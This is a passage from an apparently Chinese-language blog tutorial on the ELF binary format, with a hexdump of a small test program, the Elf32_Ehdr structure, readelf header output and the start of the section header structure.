6f  |@..............o|</span><br><span class="line">00002fa0  00 00 00 08 fe ff ff 6f  64 03 00 00 ff ff ff 6f  |.......od......o|</span><br><span class="line">00002fb0  01 00 00 00 f0 ff ff 6f  52 03 00 00 fa ff ff 6f  |.......oR......o|</span><br><span class="line">00002fc0  04 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00002fd0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00002ff0  00 00 00 00 00 00 00 00  e2 11 00 00 00 00 00 00  |................|</span><br><span class="line">00003000  fc 3e 00 00 00 00 00 00  00 00 00 00 36 10 00 00  |.&gt;..........6...|</span><br><span class="line">00003010  46 10 00 00 56 10 00 00  00 00 00 00 1c 40 00 00  |F...V........@..|</span><br><span class="line">00003020  47 43 43 3a 20 28 44 65  62 69 61 6e 20 31 30 2e  |GCC: (Debian 10.|</span><br><span class="line">00003030  32 2e 30 2d 35 29 20 31  30 2e 32 2e 30 00 00 00  |2.0-5) 10.2.0...|</span><br><span class="line">00003040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003050  00 00 00 00 94 01 00 00  00 00 00 00 03 00 01 00  |................|</span><br><span class="line">00003060  00 00 00 00 a8 01 00 00  00 00 00 00 03 00 02 00  |................|</span><br><span class="line">00003070  00 00 00 00 cc 01 00 00  00 00 00 00 03 00 03 00  |................|</span><br><span class="line">00003080  00 00 00 00 ec 01 00 00  00 00 00 00 03 00 04 00  |................|</span><br><span class="line">00003090  00 00 00 00 0c 02 00 00  00 00 00 00 03 00 05 00  |................|</span><br><span class="line">000030a0  00 00 00 00 9c 02 00 00  00 00 00 00 03 00 06 00  |................|</span><br><span class="line">000030b0  00 00 00 00 52 03 00 00  00 00 00 00 03 00 07 00  |....R...........|</span><br><span class="line">000030c0  00 00 00 00 64 03 00 00  00 00 00 00 03 00 08 00  |....d...........|</span><br><span class="line">000030d0  00 00 00 00 a4 03 00 00  00 00 00 00 03 00 09 00  |................|</span><br><span class="line">000030e0  00 00 00 00 e4 03 00 00  00 00 00 00 03 00 0a 00  |................|</span><br><span class="line">000030f0  00 00 00 00 00 10 00 00  00 00 00 00 03 00 0b 00  |................|</span><br><span class="line">00003100  00 00 00 00 20 10 00 00  00 00 00 00 03 00 0c 00  |.... ...........|</span><br><span class="line">00003110  00 00 00 00 60 10 00 00  00 00 00 00 03 00 0d 00  |....`...........|</span><br><span class="line">00003120  00 00 00 00 70 10 00 00  00 00 00 00 03 00 0e 00  |....p...........|</span><br><span class="line">00003130  00 00 00 00 e8 12 00 00  00 00 00 00 03 00 0f 00  |................|</span><br><span class="line">00003140  00 00 00 00 00 20 00 00  00 00 00 00 03 00 10 00  |..... ..........|</span><br><span class="line">00003150  00 00 00 00 7c 20 00 00  00 00 00 00 03 00 11 00  |....| ..........|</span><br><span class="line">00003160  00 00 00 00 d0 20 00 00  00 00 00 00 03 00 12 00  |..... ..........|</span><br><span class="line">00003170  00 00 00 00 f4 3e 00 00  00 00 00 00 03 00 13 00  |.....&gt;..........|</span><br><span class="line">00003180  00 00 00 00 f8 3e 00 00  00 00 00 00 03 00 14 00  |.....&gt;..........|</span><br><span class="line">00003190  00 00 00 00 fc 3e 00 00  00 00 00 00 03 00 15 00  |.....&gt;..........|</span><br><span class="line">000031a0  00 00 00 00 ec 3f 00 00  00 00 00 00 03 00 16 00  |.....?..........|</span><br><span class="line">000031b0  00 00 00 00 00 40 00 00  00 00 00 00 03 00 17 00  |.....@..........|</span><br><span class="line">000031c0  00 00 00 00 18 40 00 00  00 00 00 00 03 00 18 00  |.....@..........|</span><br><span class="line">000031d0  00 00 00 00 20 40 00 00  00 00 00 00 03 00 19 00  |.... @..........|</span><br><span class="line">000031e0  00 00 00 00 00 00 00 00  00 00 00 00 03 00 1a 00  |................|</span><br><span class="line">000031f0  01 00 00 00 00 00 00 00  00 00 00 00 04 00 f1 ff  |................|</span><br><span class="line">00003200  0c 00 00 00 c0 10 00 00  00 00 00 00 02 00 0e 00  |................|</span><br><span class="line">00003210  0e 00 00 00 00 11 00 00  00 00 00 00 02 00 0e 00  |................|</span><br><span class="line">00003220  21 00 00 00 50 11 00 00  00 00 00 00 02 00 0e 00  |!...P...........|</span><br><span class="line">00003230  37 00 00 00 20 40 00 00  01 00 00 00 01 00 19 00  |7... @..........|</span><br><span class="line">00003240  43 00 00 00 f8 3e 00 00  00 00 00 00 01 00 14 00  |C....&gt;..........|</span><br><span class="line">00003250  6a 00 00 00 a0 11 00 00  00 00 00 00 02 00 0e 00  |j...............|</span><br><span class="line">00003260  76 00 00 00 f4 3e 00 00  00 00 00 00 01 00 13 00  |v....&gt;..........|</span><br><span class="line">00003270  95 00 00 00 00 00 00 00  00 00 00 00 04 00 f1 ff  |................|</span><br><span class="line">00003280  01 00 00 00 00 00 00 00  00 00 00 00 04 00 f1 ff  |................|</span><br><span class="line">00003290  9c 00 00 00 2c 22 00 00  00 00 00 00 01 00 12 00  |....,&quot;..........|</span><br><span class="line">000032a0  00 00 00 00 00 00 00 00  00 00 00 00 04 00 f1 ff  |................|</span><br><span class="line">000032b0  aa 00 00 00 f8 3e 00 00  00 00 00 00 00 00 13 00  |.....&gt;..........|</span><br><span class="line">000032c0  bb 00 00 00 fc 3e 00 00  00 00 00 00 01 00 15 00  |.....&gt;..........|</span><br><span class="line">000032d0  c4 00 00 00 f4 3e 00 00  00 00 00 00 00 00 13 00  |.....&gt;..........|</span><br><span class="line">000032e0  d7 00 00 00 7c 20 00 00  00 00 00 00 00 00 11 00  |....| ..........|</span><br><span class="line">000032f0  ea 00 00 00 00 40 00 00  00 00 00 00 01 00 17 00  |.....@..........|</span><br><span class="line">00003300  06 02 00 00 00 10 00 00  00 00 00 00 02 00 0b 00  |................|</span><br><span class="line">00003310  00 01 00 00 e0 12 00 00  01 00 00 00 12 00 0e 00  |................|</span><br><span class="line">00003320  10 01 00 00 00 00 00 00  00 00 00 00 20 00 00 00  |............ ...|</span><br><span class="line">00003330  2c 01 00 00 b0 10 00 00  04 00 00 00 12 02 0e 00  |,...............|</span><br><span class="line">00003340  a9 01 00 00 18 40 00 00  00 00 00 00 20 00 18 00  |.....@...... ...|</span><br><span class="line">00003350  42 01 00 00 a9 11 00 00  39 00 00 00 12 00 0e 00  |B.......9.......|</span><br><span class="line">00003360  46 01 00 00 00 00 00 00  00 00 00 00 12 00 00 00  |F...............|</span><br><span class="line">00003370  58 01 00 00 e1 12 00 00  00 00 00 00 12 02 0e 00  |X...............|</span><br><span class="line">00003380  6e 01 00 00 20 40 00 00  00 00 00 00 10 00 18 00  |n... @..........|</span><br><span class="line">00003390  0a 01 00 00 e8 12 00 00  00 00 00 00 12 02 0f 00  |................|</span><br><span class="line">000033a0  75 01 00 00 a5 11 00 00  00 00 00 00 12 02 0e 00  |u...............|</span><br><span class="line">000033b0  8b 01 00 00 00 00 00 00  00 00 00 00 22 00 00 00  |............&quot;...|</span><br><span class="line">000033c0  a7 01 00 00 18 40 00 00  00 00 00 00 10 00 18 00  |.....@..........|</span><br><span class="line">000033d0  b4 01 00 00 00 00 00 00  00 00 00 00 20 00 00 00  |............ ...|</span><br><span class="line">000033e0  c3 01 00 00 1c 40 00 00  00 00 00 00 11 02 18 00  |.....@..........|</span><br><span class="line">000033f0  d0 01 00 00 04 20 00 00  04 00 00 00 11 00 10 00  |..... ..........|</span><br><span class="line">00003400  df 01 00 00 00 00 00 00  00 00 00 00 12 00 00 00  |................|</span><br><span class="line">00003410  fc 01 00 00 80 12 00 00  5d 00 00 00 12 00 0e 00  |........].......|</span><br><span class="line">00003420  b6 00 00 00 24 40 00 00  00 00 00 00 10 00 19 00  |....$@..........|</span><br><span class="line">00003430  ad 01 00 00 70 10 00 00  36 00 00 00 12 00 0e 00  |....p...6.......|</span><br><span class="line">00003440  0c 02 00 00 00 20 00 00  04 00 00 00 11 00 10 00  |..... ..........|</span><br><span class="line">00003450  13 02 00 00 20 40 00 00  00 00 00 00 10 00 19 00  |.... @..........|</span><br><span class="line">00003460  1f 02 00 00 e2 11 00 00  97 00 00 00 12 00 0e 00  |................|</span><br><span class="line">00003470  24 02 00 00 79 12 00 00  00 00 00 00 12 02 0e 00  |$...y...........|</span><br><span class="line">00003480  3a 02 00 00 00 00 00 00  00 00 00 00 12 00 00 00  |:...............|</span><br><span class="line">00003490  54 02 00 00 20 40 00 00  00 00 00 00 11 02 18 00  |T... @..........|</span><br><span class="line">000034a0  60 02 00 00 00 00 00 00  00 00 00 00 20 00 00 00  |`........... ...|</span><br><span class="line">000034b0  00 63 72 74 73 74 75 66  66 2e 63 00 64 65 72 65  |.crtstuff.c.dere|</span><br><span class="line">000034c0  67 69 73 74 65 72 5f 74  6d 5f 63 6c 6f 6e 65 73  |gister_tm_clones|</span><br><span class="line">000034d0  00 5f 5f 64 6f 5f 67 6c  6f 62 61 6c 5f 64 74 6f  |.__do_global_dto|</span><br><span class="line">000034e0  72 73 5f 61 75 78 00 63  6f 6d 70 6c 65 74 65 64  |rs_aux.completed|</span><br><span class="line">000034f0  2e 30 00 5f 5f 64 6f 5f  67 6c 6f 62 61 6c 5f 64  |.0.__do_global_d|</span><br><span class="line">00003500  74 6f 72 73 5f 61 75 78  5f 66 69 6e 69 5f 61 72  |tors_aux_fini_ar|</span><br><span class="line">00003510  72 61 79 5f 65 6e 74 72  79 00 66 72 61 6d 65 5f  |ray_entry.frame_|</span><br><span class="line">00003520  64 75 6d 6d 79 00 5f 5f  66 72 61 6d 65 5f 64 75  |dummy.__frame_du|</span><br><span class="line">00003530  6d 6d 79 5f 69 6e 69 74  5f 61 72 72 61 79 5f 65  |mmy_init_array_e|</span><br><span class="line">00003540  6e 74 72 79 00 74 65 73  74 2e 63 00 5f 5f 46 52  |ntry.test.c.__FR|</span><br><span class="line">00003550  41 4d 45 5f 45 4e 44 5f  5f 00 5f 5f 69 6e 69 74  |AME_END__.__init|</span><br><span class="line">00003560  5f 61 72 72 61 79 5f 65  6e 64 00 5f 44 59 4e 41  |_array_end._DYNA|</span><br><span class="line">00003570  4d 49 43 00 5f 5f 69 6e  69 74 5f 61 72 72 61 79  |MIC.__init_array|</span><br><span class="line">00003580  5f 73 74 61 72 74 00 5f  5f 47 4e 55 5f 45 48 5f  |_start.__GNU_EH_|</span><br><span class="line">00003590  46 52 41 4d 45 5f 48 44  52 00 5f 47 4c 4f 42 41  |FRAME_HDR._GLOBA|</span><br><span class="line">000035a0  4c 5f 4f 46 46 53 45 54  5f 54 41 42 4c 45 5f 00  |L_OFFSET_TABLE_.|</span><br><span class="line">000035b0  5f 5f 6c 69 62 63 5f 63  73 75 5f 66 69 6e 69 00  |__libc_csu_fini.|</span><br><span class="line">000035c0  5f 49 54 4d 5f 64 65 72  65 67 69 73 74 65 72 54  |_ITM_deregisterT|</span><br><span class="line">000035d0  4d 43 6c 6f 6e 65 54 61  62 6c 65 00 5f 5f 78 38  |MCloneTable.__x8|</span><br><span class="line">000035e0  36 2e 67 65 74 5f 70 63  5f 74 68 75 6e 6b 2e 62  |6.get_pc_thunk.b|</span><br><span class="line">000035f0  78 00 61 64 64 00 70 72  69 6e 74 66 40 40 47 4c  |x.add.printf@@GL|</span><br><span class="line">00003600  49 42 43 5f 32 2e 30 00  5f 5f 78 38 36 2e 67 65  |IBC_2.0.__x86.ge|</span><br><span class="line">00003610  74 5f 70 63 5f 74 68 75  6e 6b 2e 62 70 00 5f 65  |t_pc_thunk.bp._e|</span><br><span class="line">00003620  64 61 74 61 00 5f 5f 78  38 36 2e 67 65 74 5f 70  |data.__x86.get_p|</span><br><span class="line">00003630  63 5f 74 68 75 6e 6b 2e  64 78 00 5f 5f 63 78 61  |c_thunk.dx.__cxa|</span><br><span class="line">00003640  5f 66 69 6e 61 6c 69 7a  65 40 40 47 4c 49 42 43  |_finalize@@GLIBC|</span><br><span class="line">00003650  5f 32 2e 31 2e 33 00 5f  5f 64 61 74 61 5f 73 74  |_2.1.3.__data_st|</span><br><span class="line">00003660  61 72 74 00 5f 5f 67 6d  6f 6e 5f 73 74 61 72 74  |art.__gmon_start|</span><br><span class="line">00003670  5f 5f 00 5f 5f 64 73 6f  5f 68 61 6e 64 6c 65 00  |__.__dso_handle.|</span><br><span class="line">00003680  5f 49 4f 5f 73 74 64 69  6e 5f 75 73 65 64 00 5f  |_IO_stdin_used._|</span><br><span class="line">00003690  5f 6c 69 62 63 5f 73 74  61 72 74 5f 6d 61 69 6e  |_libc_start_main|</span><br><span class="line">000036a0  40 40 47 4c 49 42 43 5f  32 2e 30 00 5f 5f 6c 69  |@@GLIBC_2.0.__li|</span><br><span class="line">000036b0  62 63 5f 63 73 75 5f 69  6e 69 74 00 5f 66 70 5f  |bc_csu_init._fp_|</span><br><span class="line">000036c0  68 77 00 5f 5f 62 73 73  5f 73 74 61 72 74 00 6d  |hw.__bss_start.m|</span><br><span class="line">000036d0  61 69 6e 00 5f 5f 78 38  36 2e 67 65 74 5f 70 63  |ain.__x86.get_pc|</span><br><span class="line">000036e0  5f 74 68 75 6e 6b 2e 61  78 00 5f 5f 69 73 6f 63  |_thunk.ax.__isoc|</span><br><span class="line">000036f0  39 39 5f 73 63 61 6e 66  40 40 47 4c 49 42 43 5f  |99_scanf@@GLIBC_|</span><br><span class="line">00003700  32 2e 37 00 5f 5f 54 4d  43 5f 45 4e 44 5f 5f 00  |2.7.__TMC_END__.|</span><br><span class="line">00003710  5f 49 54 4d 5f 72 65 67  69 73 74 65 72 54 4d 43  |_ITM_registerTMC|</span><br><span class="line">00003720  6c 6f 6e 65 54 61 62 6c  65 00 00 2e 73 79 6d 74  |loneTable...symt|</span><br><span class="line">00003730  61 62 00 2e 73 74 72 74  61 62 00 2e 73 68 73 74  |ab..strtab..shst|</span><br><span class="line">00003740  72 74 61 62 00 2e 69 6e  74 65 72 70 00 2e 6e 6f  |rtab..interp..no|</span><br><span class="line">00003750  74 65 2e 67 6e 75 2e 62  75 69 6c 64 2d 69 64 00  |te.gnu.build-id.|</span><br><span class="line">00003760  2e 6e 6f 74 65 2e 41 42  49 2d 74 61 67 00 2e 67  |.note.ABI-tag..g|</span><br><span class="line">00003770  6e 75 2e 68 61 73 68 00  2e 64 79 6e 73 79 6d 00  |nu.hash..dynsym.|</span><br><span class="line">00003780  2e 64 79 6e 73 74 72 00  2e 67 6e 75 2e 76 65 72  |.dynstr..gnu.ver|</span><br><span class="line">00003790  73 69 6f 6e 00 2e 67 6e  75 2e 76 65 72 73 69 6f  |sion..gnu.versio|</span><br><span class="line">000037a0  6e 5f 72 00 2e 72 65 6c  2e 64 79 6e 00 2e 72 65  |n_r..rel.dyn..re|</span><br><span class="line">000037b0  6c 2e 70 6c 74 00 2e 69  6e 69 74 00 2e 70 6c 74  |l.plt..init..plt|</span><br><span class="line">000037c0  2e 67 6f 74 00 2e 74 65  78 74 00 2e 66 69 6e 69  |.got..text..fini|</span><br><span class="line">000037d0  00 2e 72 6f 64 61 74 61  00 2e 65 68 5f 66 72 61  |..rodata..eh_fra|</span><br><span class="line">000037e0  6d 65 5f 68 64 72 00 2e  65 68 5f 66 72 61 6d 65  |me_hdr..eh_frame|</span><br><span class="line">000037f0  00 2e 69 6e 69 74 5f 61  72 72 61 79 00 2e 66 69  |..init_array..fi|</span><br><span class="line">00003800  6e 69 5f 61 72 72 61 79  00 2e 64 79 6e 61 6d 69  |ni_array..dynami|</span><br><span class="line">00003810  63 00 2e 67 6f 74 2e 70  6c 74 00 2e 64 61 74 61  |c..got.plt..data|</span><br><span class="line">00003820  00 2e 62 73 73 00 2e 63  6f 6d 6d 65 6e 74 00 00  |..bss..comment..|</span><br><span class="line">00003830  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00003850  00 00 00 00 00 00 00 00  1b 00 00 00 01 00 00 00  |................|</span><br><span class="line">00003860  02 00 00 00 94 01 00 00  94 01 00 00 13 00 00 00  |................|</span><br><span class="line">00003870  00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003880  23 00 00 00 07 00 00 00  02 00 00 00 a8 01 00 00  |#...............|</span><br><span class="line">00003890  a8 01 00 00 24 00 00 00  00 00 00 00 00 00 00 00  |....$...........|</span><br><span class="line">000038a0  04 00 00 00 00 00 00 00  36 00 00 00 07 00 00 00  |........6.......|</span><br><span class="line">000038b0  02 00 00 00 cc 01 00 00  cc 01 00 00 20 00 00 00  |............ ...|</span><br><span class="line">000038c0  00 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |................|</span><br><span class="line">000038d0  44 00 00 00 f6 ff ff 6f  02 00 00 00 ec 01 00 00  |D......o........|</span><br><span class="line">000038e0  ec 01 00 00 20 00 00 00  05 00 00 00 00 00 00 00  |.... ...........|</span><br><span class="line">000038f0  04 00 00 00 04 00 00 00  4e 00 00 00 0b 00 00 00  |........N.......|</span><br><span class="line">00003900  02 00 00 00 0c 02 00 00  0c 02 00 00 90 00 00 00  |................|</span><br><span class="line">00003910  06 00 00 00 01 00 00 00  04 00 00 00 10 00 00 00  |................|</span><br><span class="line">00003920  56 00 00 00 03 00 00 00  02 00 00 00 9c 02 00 00  |V...............|</span><br><span class="line">00003930  9c 02 00 00 b6 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003940  01 00 00 00 00 00 00 00  5e 00 00 00 ff ff ff 6f  |........^......o|</span><br><span class="line">00003950  02 00 00 00 52 03 00 00  52 03 00 00 12 00 00 00  |....R...R.......|</span><br><span class="line">00003960  05 00 00 00 00 00 00 00  02 00 00 00 02 00 00 00  |................|</span><br><span class="line">00003970  6b 00 00 00 fe ff ff 6f  02 00 00 00 64 03 00 00  |k......o....d...|</span><br><span class="line">00003980  64 03 00 00 40 00 00 00  06 00 00 00 01 00 00 00  |d...@...........|</span><br><span class="line">00003990  04 00 00 00 00 00 00 00  7a 00 00 00 09 00 00 00  |........z.......|</span><br><span class="line">000039a0  02 00 00 00 a4 03 00 00  a4 03 00 00 40 00 00 00  |............@...|</span><br><span class="line">000039b0  05 00 00 00 00 00 00 00  04 00 00 00 08 00 00 00  |................|</span><br><span class="line">000039c0  83 00 00 00 09 00 00 00  42 00 00 00 e4 03 00 00  |........B.......|</span><br><span class="line">000039d0  e4 03 00 00 18 00 00 00  05 00 00 00 17 00 00 00  |................|</span><br><span class="line">000039e0  04 00 00 00 08 00 00 00  8c 00 00 00 01 00 00 00  |................|</span><br><span class="line">000039f0  06 00 00 00 00 10 00 00  00 10 00 00 20 00 00 00  |............ ...|</span><br><span class="line">00003a00  00 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003a10  87 00 00 00 01 00 00 00  06 00 00 00 20 10 00 00  |............ ...|</span><br><span class="line">00003a20  20 10 00 00 40 00 00 00  00 00 00 00 00 00 00 00  | ...@...........|</span><br><span class="line">00003a30  10 00 00 00 04 00 00 00  92 00 00 00 01 00 00 00  |................|</span><br><span class="line">00003a40  06 00 00 00 60 10 00 00  60 10 00 00 08 00 00 00  |....`...`.......|</span><br><span class="line">00003a50  00 00 00 00 00 00 00 00  08 00 00 00 08 00 00 00  |................|</span><br><span class="line">00003a60  9b 00 00 00 01 00 00 00  06 00 00 00 70 10 00 00  |............p...|</span><br><span class="line">00003a70  70 10 00 00 75 02 00 00  00 00 00 00 00 00 00 00  |p...u...........|</span><br><span class="line">00003a80  10 00 00 00 00 00 00 00  a1 00 00 00 01 00 00 00  |................|</span><br><span class="line">00003a90  06 00 00 00 e8 12 00 00  e8 12 00 00 14 00 00 00  |................|</span><br><span class="line">00003aa0  00 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003ab0  a7 00 00 00 01 00 00 00  02 00 00 00 00 20 00 00  |............. ..|</span><br><span class="line">00003ac0  00 20 00 00 7b 00 00 00  00 00 00 00 00 00 00 00  |. ..&#123;...........|</span><br><span class="line">00003ad0  04 00 00 00 00 00 00 00  af 00 00 00 01 00 00 00  |................|</span><br><span class="line">00003ae0  02 00 00 00 7c 20 00 00  7c 20 00 00 54 00 00 00  |....| ..| ..T...|</span><br><span class="line">00003af0  00 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003b00  bd 00 00 00 01 00 00 00  02 00 00 00 d0 20 00 00  |............. ..|</span><br><span class="line">00003b10  d0 20 00 00 60 01 00 00  00 00 00 00 00 00 00 00  |. ..`...........|</span><br><span class="line">00003b20  04 00 00 00 00 00 00 00  c7 00 00 00 0e 00 00 00  |................|</span><br><span class="line">00003b30  03 00 00 00 f4 3e 00 00  f4 2e 00 00 04 00 00 00  |.....&gt;..........|</span><br><span class="line">00003b40  00 00 00 00 00 00 00 00  04 00 00 00 04 00 00 00  |................|</span><br><span class="line">00003b50  d3 00 00 00 0f 00 00 00  03 00 00 00 f8 3e 00 00  |.............&gt;..|</span><br><span class="line">00003b60  f8 2e 00 00 04 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003b70  04 00 00 00 04 00 00 00  df 00 00 00 06 00 00 00  |................|</span><br><span class="line">00003b80  03 00 00 00 fc 3e 00 00  fc 2e 00 00 f0 00 00 00  |.....&gt;..........|</span><br><span class="line">00003b90  06 00 00 00 00 00 00 00  04 00 00 00 08 00 00 00  |................|</span><br><span class="line">00003ba0  96 00 00 00 01 00 00 00  03 00 00 00 ec 3f 00 00  |.............?..|</span><br><span class="line">00003bb0  ec 2f 00 00 14 00 00 00  00 00 00 00 00 00 00 00  |./..............|</span><br><span class="line">00003bc0  04 00 00 00 04 00 00 00  e8 00 00 00 01 00 00 00  |................|</span><br><span class="line">00003bd0  03 00 00 00 00 40 00 00  00 30 00 00 18 00 00 00  |.....@...0......|</span><br><span class="line">00003be0  00 00 00 00 00 00 00 00  04 00 00 00 04 00 00 00  |................|</span><br><span class="line">00003bf0  f1 00 00 00 01 00 00 00  03 00 00 00 18 40 00 00  |.............@..|</span><br><span class="line">00003c00  18 30 00 00 08 00 00 00  00 00 00 00 00 00 00 00  |.0..............|</span><br><span class="line">00003c10  04 00 00 00 00 00 00 00  f7 00 00 00 08 00 00 00  |................|</span><br><span class="line">00003c20  03 00 00 00 20 40 00 00  20 30 00 00 04 00 00 00  |.... @.. 0......|</span><br><span class="line">00003c30  00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003c40  fc 00 00 00 01 00 00 00  30 00 00 00 00 00 00 00  |........0.......|</span><br><span class="line">00003c50  20 30 00 00 1e 00 00 00  00 00 00 00 00 00 00 00  | 0..............|</span><br><span class="line">00003c60  01 00 00 00 01 00 00 00  01 00 00 00 02 00 00 00  |................|</span><br><span class="line">00003c70  00 00 00 00 00 00 00 00  40 30 00 00 70 04 00 00  |........@0..p...|</span><br><span class="line">00003c80  1c 00 00 00 2d 00 00 00  04 00 00 00 10 00 00 00  |....-...........|</span><br><span class="line">00003c90  09 00 00 00 03 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003ca0  b0 34 00 00 7a 02 00 00  00 00 00 00 00 00 00 00  |.4..z...........|</span><br><span class="line">00003cb0  01 00 00 00 00 00 00 00  11 00 00 00 03 00 00 00  |................|</span><br><span class="line">00003cc0  00 00 00 00 00 00 00 00  2a 37 00 00 05 01 00 00  |........*7......|</span><br><span class="line">00003cd0  00 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|</span><br><span class="line">00003ce0</span><br></pre></td></tr></table></figure><h2 id="0x02-ELF文件的结构"><a href="#0x02-ELF文件的结构" class="headerlink" title="0x02.ELF文件的结构"></a><font color="navy">0x02.ELF文件的结构</font></h2><h3 id="1-ELF的头部（52个字节）"><a href="#1-ELF的头部（52个字节）" class="headerlink" title="1.ELF的头部（52个字节）"></a>1.ELF的头部（52个字节）</h3><p>首先来看elf.h文件中ELF头部的结构体 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT];     <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half    e_type;                 <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half    e_machine;              <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word    e_version;              <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr    e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off     e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off     e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word    e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half    e_ehsize;               <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half    e_phentsize;            <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half    e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half    e_shentsize;            <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half    e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half    e_shstrndx;             <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p>其中，e_ident数组给出了ELF的一些标识信息，这个数组中不同下标的含义如表所示：</p><p><img src="/images/150-4.png" alt></p><p>&gt;</p><blockquote><p>从上面的结构体可以看出，ELF头部的大小为<code>16+2+2+4+4+4+4+4+2+2+2+2+2+2</code> = <code>52</code></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf -h <span class="built_in">test</span></span></span><br></pre></td></tr></table></figure><blockquote><p>得到如下的结果c</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">ELF Header:</span><br><span class="line">+-------------------------------------------------------------------+</span><br><span class="line">| Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 |</span><br><span class="line">| Class:                             ELF32|</span><br><span class="line">| Data:                              2&apos;s complement, little endian|</span><br><span class="line">| Version:                           1 (current)|</span><br><span class="line">| OS/ABI:                            UNIX - System V|</span><br><span class="line">| ABI Version:                       0|</span><br><span class="line">+-------------------------------------------------------------------+</span><br><span class="line">  Type:                              DYN (Shared object file)              </span><br><span class="line">  Machine:                           Intel 80386</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x1070</span><br><span class="line">  Start of program headers:          52 (bytes into file)</span><br><span class="line">  Start of section headers:          14384 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           32 (bytes)</span><br><span class="line">  Number of program headers:         11</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         30</span><br><span class="line">  Section header string table index: 29</span><br></pre></td></tr></table></figure><blockquote><p>可以从上面得到如下信息：</p><ul><li>程序入口的地址</li><li>程序头的偏移</li><li>段表头的偏移：里面包含各个段的大小、偏移和其他相关信息</li><li>段表的数量：通过段表头的偏移+每段固定的大小+段表的数量，就可以确定section的大小范围</li></ul></blockquote><p>上述实例代码中的头部信息为：</p><p><img src="/images/150-3.png" alt></p><h3 id="2-ELF的程序头"><a href="#2-ELF的程序头" class="headerlink" title="2.ELF的程序头"></a>2.ELF的程序头</h3><blockquote><p>程序头部表（Program Header Table），如果存在的话，则是告诉系统如何创建进程映像。用来构造进程映像的目标文件必须具有程序头部表，可重定位文件不需要这个表。</p></blockquote><font size="2">通过ELF的文件头可以看出，文中实例的程序头位于ELF文件的`52`字节的偏移处</font><h3 id="3-ELF的段表"><a href="#3-ELF的段表" class="headerlink" title="3.ELF的段表"></a>3.ELF的段表</h3><p>ELF的段表结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Section header.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    sh_name;                <span class="comment">/* Section name (string tbl index) */</span></span><br><span 